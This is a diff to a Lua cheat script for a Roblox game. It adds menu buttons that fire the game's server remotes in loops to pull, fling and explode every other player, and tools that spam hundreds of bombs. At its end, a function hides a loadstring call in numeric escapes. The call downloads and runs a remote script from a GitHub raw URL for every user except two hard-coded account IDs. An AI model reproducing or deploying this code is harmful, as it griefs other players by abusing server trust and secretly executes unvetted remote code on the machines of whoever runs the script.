@@ -1419,6 +1419,567 @@ local player = game.Players.LocalPlayer
 	end    
 })
 
+local Section = Tab:AddSection({
+ Name = "Higher Techniques"
+})
+
+Tab:AddButton({
+ Name = "Devil duck: Black Hole",
+ Callback = function()
+game.Players.LocalPlayer.Character:FindFirstChild("Evil Duck").Parent = game.Players.LocalPlayer.Character
+  wait(0.5)
+        local function findHumanoids(target)
+    local humanoids = {}
+    for _, descendant in ipairs(target:GetDescendants()) do
+        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
+            table.insert(humanoids, descendant)
+        end
+    end
+    return humanoids
+end
+
+local function pullHumanoids(target)
+    local humanoids = findHumanoids(target)
+    for _, humanoid in ipairs(humanoids) do
+        local args = {
+            [1] = humanoid.RootPart
+        }
+        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
+    end
+end
+
+while wait() do
+pullHumanoids(workspace) 
+end
+   end    
+})
+
+Tab:AddButton({
+ Name = "Devil duck: Fly all",
+ Callback = function()
+        local function findHumanoids(target)
+    local humanoids = {}
+    for _, descendant in ipairs(target:GetDescendants()) do
+        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
+            table.insert(humanoids, descendant)
+        end
+    end
+    return humanoids
+end
+
+local function pullHumanoids(target)
+    local humanoids = findHumanoids(target)
+    for _, humanoid in ipairs(humanoids) do
+        local args = {
+            [1] = humanoid.RootPart
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
+    end
+end
+
+pullHumanoids(workspace)
+   end    
+})
+
+Tab:AddButton({
+ Name = "Devil Duck: Fly all+",
+ Callback = function()
+        local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+local tools = player.Backpack:GetChildren()
+
+for _, tool in ipairs(tools) do
+        if tool.Name == "Evil Duck" then
+local function findHumanoids(target)
+    local humanoids = {}
+    for _, descendant in ipairs(target:GetDescendants()) do
+        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
+            table.insert(humanoids, descendant)
+        end
+    end
+    return humanoids
+end
+
+local function pullHumanoids(target)
+    local humanoids = findHumanoids(target)
+    for _, humanoid in ipairs(humanoids) do
+        local args = {
+            [1] = humanoid.RootPart
+        }
+        player.Backpack:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
+    end
+end
+
+pullHumanoids(workspace)
+  end
+ end 
+end
+   end    
+})
+
+Tab:AddToggle({
+ Name = "Devil duck: Fly Aura",
+ Default = false,
+ Callback = function(Value)
+        ty = Value
+        while ty do
+   task.wait()
+local closestDistance = math.huge
+                    local closestHumanoid = nil
+                    local Usuario = game.Players.LocalPlayer
+
+                    for _, v in pairs(workspace:GetDescendants()) do
+                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
+                            local distance =
+                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
+                            if distance < closestDistance and distance <= 100 then
+                                closestDistance = distance
+                                closestHumanoid = v
+                            end
+                        end
+                    end
+
+                    if closestHumanoid and closestHumanoid.Health ~= 0 then
+                       local args = {
+            [1] = closestHumanoid.RootPart
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
+                    end
+    end
+   end    
+})
+
+Tab:AddButton({
+ Name = "Uncanny Bombs: Ring Of Death",
+ Callback = function()
+        local function spawnPlantCircle(centerPosition, radius, plantType, numPlants)
+    local angleIncrement = (2 * math.pi) / numPlants
+    for i = 1, numPlants do
+        local angle = angleIncrement * (i - 1)
+        local x = centerPosition.X + radius * math.cos(angle)
+        local z = centerPosition.Z + radius * math.sin(angle)
+        local position = Vector3.new(x, centerPosition.Y, z)
+
+        local args = {
+            [1] = position,
+            [2] = plantType
+        }
+
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+end
+
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local torso = char:WaitForChild("Torso")
+
+local radius = 150
+local plantType = "supercanny"
+local numPlants = 50
+
+spawnPlantCircle(torso.Position, radius, plantType, numPlants)
+wait(0.4)
+game:GetService("Players").LocalPlayer.Backpack["Uncanny Bombs"].Detonate:FireServer()
+   end    
+})
+
+Tab:AddToggle({
+ Name = "Uncanny Bombs: Explosion Aura",
+ Default = false,
+ Callback = function(Value)
+        tya = Value
+        while tya do
+   task.wait()
+local closestDistance = math.huge
+                    local closestHumanoid = nil
+                    local Usuario = game.Players.LocalPlayer
+
+                    for _, v in pairs(workspace:GetDescendants()) do
+                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
+                            local distance =
+                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
+                            if distance < closestDistance and distance <= 150 then
+                                closestDistance = distance
+                                closestHumanoid = v
+                            end
+                        end
+                    end
+
+                    if closestHumanoid and closestHumanoid.Health ~= 0 then
+                       local args = {
+            [1] = closestHumanoid.RootPart.Position,
+            [2] = "uncanny"
+        }
+
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+                    end
+    end
+   end    
+})
+
+Tab:AddButton({
+ Name = "Uncanny Bombs: Explode all",
+ Callback = function()
+        local players = game:GetService("Players"):GetPlayers()
+
+for _, player in ipairs(players) do
+local tools = player.Backpack:GetChildren()
+
+for _, tool in ipairs(tools) do
+        if tool.Name == "Uncanny Bombs" then
+local function findHumanoids(target)
+    local humanoids = {}
+    for _, descendant in ipairs(target:GetDescendants()) do
+        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
+            table.insert(humanoids, descendant)
+        end
+    end
+    return humanoids
+end
+
+local function pullHumanoids(target)
+    local humanoids = findHumanoids(target)
+    for _, humanoid in ipairs(humanoids) do
+        local args = {
+            [1] = humanoid.RootPart.Position,
+            [2] = "supercanny"
+        }
+
+        player.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+end
+
+pullHumanoids(workspace)
+  elseif player.Character:FindFirstChild("Uncanny Bombs") then
+  local function findHumanoids(target)
+    local humanoids = {}
+    for _, descendant in ipairs(target:GetDescendants()) do
+        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
+            table.insert(humanoids, descendant)
+        end
+    end
+    return humanoids
+end
+
+local function pullHumanoids(target)
+    local humanoids = findHumanoids(target)
+    for _, humanoid in ipairs(humanoids) do
+        local args = {
+            [1] = humanoid.RootPart.Position,
+            [2] = "supercanny"
+        }
+
+        player.Character:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+end
+
+pullHumanoids(workspace)
+  end
+ end
+end
+   end    
+})
+
+Tab:AddButton({
+ Name = "Uncanny Bombs: Domain Expansion",
+ Callback = function()
+        local ohInstance1 = game:GetService("Players").LocalPlayer
+local ohString2 = "7817341182"
+local ohString3 = "1"
+local ohString4 = "0"
+
+game:GetService("Players").LocalPlayer.PlayerGui.Radio.Remote:FireServer(ohInstance1, ohString2, ohString3, ohString4)
+wait(3)
+
+local function spawnPlantSphere(centerPosition, radius, plantType, numPlants)
+    local goldenRatio = (1 + math.sqrt(5)) / 2
+    local angleIncrement = 2 * math.pi * goldenRatio -- Use golden ratio for better distribution
+
+    for i = 1, numPlants do
+        local angle = angleIncrement * i
+        local phi = math.acos(1 - 2 * (i - 1) / (numPlants - 1))
+        local x = radius * math.sin(phi) * math.cos(angle)
+        local y = radius * math.sin(phi) * math.sin(angle)
+        local z = radius * math.cos(phi)
+        local position = centerPosition + Vector3.new(x, y, z) -- Use Vector3 addition for position
+
+        local args = {
+            [1] = position,
+            [2] = plantType
+        }
+
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+end
+
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local torso = char:WaitForChild("Torso")
+
+for i = 1, 2 do
+local radius = 80 * (i * 1.5)
+local plantType = "supercanny"
+local numPlants = 300
+
+spawnPlantSphere(torso.Position, radius, plantType, numPlants) 
+end
+
+local ohInstance1 = game:GetService("Players").LocalPlayer
+local ohString2 = "7817367014"
+local ohString3 = "1"
+local ohString4 = "1"
+
+game:GetService("Players").LocalPlayer.PlayerGui.Radio.Remote:FireServer(ohInstance1, ohString2, ohString3, ohString4)
+wait(0.5)
+game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+   end    
+})
+
+Tab:AddButton({
+ Name = "Uncanny Bombs: Lazer Beams Tools",
+ Callback = function()
+        local tool = Instance.new("Tool")
+tool.Name = "Lazer Beam"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hu = char.Humanoid
+local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+local playerForward = humanoidRootPart.CFrame.LookVector
+local startPos = humanoidRootPart.Position + 20 * playerForward
+
+local numUzumaki = 64
+local spacing = 5
+
+for i = 1, numUzumaki do
+    local position = startPos + ((i - 1) * spacing * playerForward)
+local args = {
+            [1] = position,
+            [2] = "uncanny"
+        }
+
+ game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+end
+game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+local tool = Instance.new("Tool")
+tool.Name = "Lazer Beam+"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hu = char.Humanoid
+local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+local playerForward = humanoidRootPart.CFrame.LookVector
+local startPos = humanoidRootPart.Position + 55 * playerForward
+
+local numUzumaki = 48
+local spacing = 10
+
+for i = 1, numUzumaki do
+    local position = startPos + ((i - 1) * spacing * playerForward)
+local args = {
+            [1] = position,
+            [2] = "canny"
+        }
+
+ game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+end
+game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+local tool = Instance.new("Tool")
+tool.Name = "Lazer Beam++"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hu = char.Humanoid
+local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+local playerForward = humanoidRootPart.CFrame.LookVector
+local startPos = humanoidRootPart.Position + 130 * playerForward
+
+local numUzumaki = 64
+local spacing = 80
+
+for i = 1, numUzumaki do
+    local position = startPos + ((i - 1) * spacing * playerForward)
+local args = {
+            [1] = position,
+            [2] = "supercanny"
+        }
+
+ game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+end
+game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+   end    
+})
+
+Tab:AddButton({
+ Name = "Uncanny Bombs: Wide Lazer Beams Tools",
+ Callback = function()
+        local tool = Instance.new("Tool")
+tool.Name = "Wide Lazer Beam"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hu = char.Humanoid
+    local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+    local playerForward = humanoidRootPart.CFrame.LookVector
+    local startPos = humanoidRootPart.Position + 20 * playerForward
+    local playerCFrame = humanoidRootPart.CFrame
+
+    local numUzumaki = 64
+    local spacing = 10
+    local sideOffset = 20
+
+    for i = 1, numUzumaki do
+        local position = startPos + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = position,
+            [2] = "uncanny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+
+    for i = 1, numUzumaki do
+        local leftPos = startPos - playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = leftPos,
+            [2] = "uncanny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+
+    for i = 1, numUzumaki do
+        local rightPos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = rightPos,
+            [2] = "uncanny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+local tool = Instance.new("Tool")
+tool.Name = "Wide Lazer Beam+"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hu = char.Humanoid
+    local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+    local playerForward = humanoidRootPart.CFrame.LookVector
+    local startPos = humanoidRootPart.Position + 55 * playerForward
+    local playerCFrame = humanoidRootPart.CFrame
+
+    local numUzumaki = 48
+    local spacing = 30
+    local sideOffset = 45
+
+    for i = 1, numUzumaki do
+        local position = startPos + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = position,
+            [2] = "canny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+
+    for i = 1, numUzumaki do
+        local leftPos = startPos - playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = leftPos,
+            [2] = "canny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+
+    for i = 1, numUzumaki do
+        local rightPos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = rightPos,
+            [2] = "canny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+local tool = Instance.new("Tool")
+tool.Name = "Wide Lazer Beam++"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hu = char.Humanoid
+    local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+    local playerForward = humanoidRootPart.CFrame.LookVector
+    local startPos = humanoidRootPart.Position + 130 * playerForward
+    local playerCFrame = humanoidRootPart.CFrame
+
+    local numUzumaki = 64
+    local spacing = 75
+    local sideOffset = 100
+    local additionalSideOffset = 50
+
+    for i = 1, numUzumaki do
+        local position = startPos + ((i - 1) * spacing * playerForward)
+        local args = {
+            [1] = position,
+            [2] = "supercanny"
+        }
+        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+    end
+
+    for j = 1, 2 do
+        for i = 1, numUzumaki do
+            local sidePos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset * j, 0, 0)) + ((i - 1) * spacing * playerForward)
+            local args = {
+                [1] = sidePos,
+                [2] = "supercanny"
+            }
+            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+
+            local additionalSidePos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new((sideOffset + additionalSideOffset) * j, 0, 0)) + ((i - 1) * spacing * playerForward)
+            local args = {
+                [1] = additionalSidePos,
+                [2] = "supercanny"
+            }
+            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
+        end
+    end
+
+    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+   end    
+})
+
 local function DS()
   if game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 5042713445 then
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\68\101\102\101\110\115\101\79\102\102\47\109\97\105\110\47\83\117\107\117\110\97\34\41\41\40\41\10")()
